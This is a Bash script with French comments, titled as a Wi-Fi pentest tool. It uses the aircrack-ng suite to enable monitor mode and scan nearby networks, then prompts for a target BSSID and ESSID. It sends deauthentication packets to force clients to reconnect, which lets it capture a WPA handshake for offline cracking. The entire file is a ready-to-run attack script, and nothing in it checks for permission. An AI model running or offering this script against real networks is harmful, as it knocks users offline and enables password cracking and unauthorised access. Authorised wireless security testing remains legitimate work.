#!/bin/bash
# wifi_pentest.sh - Scan & capture WPA handshake
set -euo pipefail

# Vérifie les droits root
if [[ $EUID -ne 0 ]]; then
    echo "❌ Ce script doit être exécuté en tant que root" >&2
    exit 1
fi

# Vérification des outils requis
for cmd in airmon-ng airodump-ng aireplay-ng; do
    if ! command -v "$cmd" &>/dev/null; then
        echo "❌ Outil manquant : $cmd" >&2
        exit 1
    fi
done

# Valeurs par défaut
INTERFACE="wlan0"
OUTPUT_DIR="wifi_captures"
CHANNEL=6
CAPTURE_TIME=20
DEAUTH_COUNT=5
BSSID=""
ESSID=""

usage() {
    cat <<EOF >&2
Usage: $0 [-i interface] [-c channel] [-o output_dir] [-t seconds] [-d count] [-b bssid] [-e essid]
  -i interface : interface WiFi à utiliser (par défaut: $INTERFACE)
  -c channel   : canal WiFi (par défaut: $CHANNEL)
  -o dir       : dossier de sortie pour la capture (par défaut: $OUTPUT_DIR)
  -t seconds   : durée de capture (par défaut: $CAPTURE_TIME)
  -d count     : nombre de paquets de désauth (par défaut: $DEAUTH_COUNT)
  -b bssid     : BSSID cible (sinon demandé)
  -e essid     : ESSID du réseau (sinon demandé)
EOF
    exit 1
}

# Analyse des options
while getopts "i:c:o:t:d:b:e:h" opt; do
    case $opt in
        i) INTERFACE="$OPTARG" ;;
        c) CHANNEL="$OPTARG" ;;
        o) OUTPUT_DIR="$OPTARG" ;;
        t) CAPTURE_TIME="$OPTARG" ;;
        d) DEAUTH_COUNT="$OPTARG" ;;
        b) BSSID="$OPTARG" ;;
        e) ESSID="$OPTARG" ;;
        h|*) usage ;;
    esac
done

MONITOR_IF="${INTERFACE}mon"

mkdir -p "$OUTPUT_DIR"
LOG_FILE="$OUTPUT_DIR/scan_wifi.log"
exec > >(tee -a "$LOG_FILE") 2>&1

echo "[*] Activation du mode monitor sur $INTERFACE..."
airmon-ng start "$INTERFACE" >/dev/null

# Nettoyage en cas d'interruption
cleanup() {
    if [[ -n "${AIRDUMP_PID:-}" ]]; then
        kill "$AIRDUMP_PID" 2>/dev/null || true
    fi
    airmon-ng stop "$MONITOR_IF" >/dev/null || true
}
trap cleanup EXIT

echo "[*] Lancement du scan des réseaux disponibles..."
timeout 20s airodump-ng "$MONITOR_IF"

if [[ -z "$BSSID" ]]; then
    read -rp "Entrez le BSSID cible : " BSSID
fi
if [[ -z "$ESSID" ]]; then
    read -rp "Entrez le nom (SSID) du réseau : " ESSID
fi

echo "[*] Capture du handshake sur $ESSID ($BSSID)..."
CAP_BASENAME="handshake_$(date +%Y%m%d_%H%M%S)"
airodump-ng --bssid "$BSSID" --channel "$CHANNEL" --write "$OUTPUT_DIR/$CAP_BASENAME" "$MONITOR_IF" &
AIRDUMP_PID=$!

sleep 5
echo "[*] Déauthentification d’un client pour forcer handshake..."
aireplay-ng --deauth "$DEAUTH_COUNT" -a "$BSSID" "$MONITOR_IF"

echo "[*] Attente du handshake pendant $CAPTURE_TIME s..."
sleep "$CAPTURE_TIME"
kill "$AIRDUMP_PID" 2>/dev/null || true

# Vérifie la présence du fichier de capture
HANDSHAKE_FILE="$OUTPUT_DIR/${CAP_BASENAME}-01.cap"
if [[ -f "$HANDSHAKE_FILE" ]]; then
    echo "✅ Handshake capturé : $HANDSHAKE_FILE"
else
    echo "❌ Handshake non trouvé" >&2
fi

echo "📄 Journal enregistré dans $LOG_FILE"

